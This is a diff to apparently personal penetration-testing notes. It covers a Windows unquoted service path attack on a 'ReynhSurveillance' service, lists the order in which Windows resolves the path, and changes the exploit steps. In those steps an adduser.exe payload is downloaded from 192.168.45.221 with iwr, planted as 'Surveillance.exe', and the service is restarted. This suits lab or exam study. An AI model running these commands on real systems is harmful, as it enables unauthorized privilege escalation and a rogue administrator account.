@@ -2189,8 +2189,16 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     Start-Service ReynhSurveillance
     Stop-Service ReynhSurveillance
 
+    output> C:\Enterprise Software\Monitoring Solution\Surveillance Apps\ReynhSurveillance.exe
+
+    Windows will try these in this order:
+    C:\Enterprise.exe
+    C:\Enterprise Software\Monitoring.exe
+    C:\Enterprise Software\Monitoring Solution\Surveillance.exe
+    C:\Enterprise Software\Monitoring Solution\Surveillance Apps\ReynhSurveillance.exe ← intended
+
     iwr -uri http://192.168.45.221/adduser.exe -Outfile ReynhSurveillance.exe
-    copy .\ReynhSurveillance.exe 'C:\Enterprise Software\Monitoring Solution\Surveillance Apps\ReynhSurveillance.exe'
+    copy .\ReynhSurveillance.exe 'C:\Enterprise Software\Monitoring Solution\Surveillance.exe'
 
     Restart-Service ReynhSurveillance
     net user
